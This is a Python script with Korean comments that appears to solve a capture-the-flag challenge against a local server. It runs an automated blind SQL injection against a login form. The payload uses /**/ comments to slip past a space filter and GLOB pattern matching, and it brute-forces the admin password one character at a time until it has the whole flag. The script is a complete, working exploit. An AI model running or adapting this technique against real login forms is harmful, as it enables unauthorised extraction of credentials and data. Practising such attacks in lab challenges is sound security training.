import requests
import string

# 1. 타겟 서버 주소 (현재 켜두신 127.0.0.1:5000)
url = "http://127.0.0.1:5000/"

# 2. 플래그에 들어갈 수 있는 문자들 (영문 대소문자, 숫자, 언더바, 중괄호)
charset = string.ascii_letters + string.digits + "_{}"

# 3. 우리가 이미 알고 있는 플래그의 시작 부분
flag = "DH{"
print(f"[*] 자동화 해킹 스크립트 가동. 타겟: {url}")
print(f"[*] 추출 시작...\n")

# 4. 닫는 중괄호 '}'를 찾을 때까지 무한 반복
while True:
    found = False
    for char in charset:
        # [핵심] 방금 브라우저에서 성공했던 그 우회 페이로드입니다!
        # 글자를 하나씩(char) 바꿔가며 쿼리를 완성합니다.
        payload = f"admin'/**/and/**/upw/**/glob/**/'{flag}{char}*'/**/or/**/'1'='"
        
        data = {
            "userid": payload,
            "userpassword": "1"  # 비밀번호는 1로 고정하여 무력화
        }

        # 서버로 공격 요청(POST) 전송
        response = requests.post(url, data=data)

        # 응답 화면에 'hello admin'이 있다면 (참이라면) 글자를 찾은 것!
        if "hello admin" in response.text:
            flag += char
            print(f"[+] Pwned! 현재 플래그: {flag}")
            found = True
            break # 글자를 찾았으니, 다음 자릿수 글자를 찾으러 반복문 처음으로 돌아감

    # 만약 플래그의 끝인 '}'를 찾았거나, 문자열을 다 뒤져도 없으면 공격 종료
    if not found or flag.endswith("}"):
        print("\n[*] 추출이 완료되었습니다.")
        break

print(f"\n[🎉] 최종 플래그(비밀번호): {flag}")